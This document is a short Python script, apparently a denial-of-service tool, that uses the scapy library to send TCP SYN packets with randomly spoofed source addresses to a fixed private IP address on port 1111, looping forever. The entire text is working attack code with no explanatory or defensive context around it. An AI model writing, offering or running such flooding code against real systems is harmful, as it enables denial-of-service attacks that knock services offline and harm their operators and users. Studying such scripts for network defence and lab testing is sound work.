import sys
from scapy.all import *

def synFlood():
    target_ip = "192.168.1.17"
    s_addr = RandIP()

    s_port = range(1, 65535)
    ip = IP(src=s_addr, dst=target_ip)
    tcp = TCP(sport=s_port, dport=1111, flags="S")

    pkt = ip / tcp
    send(pkt)


while True:
    synFlood()
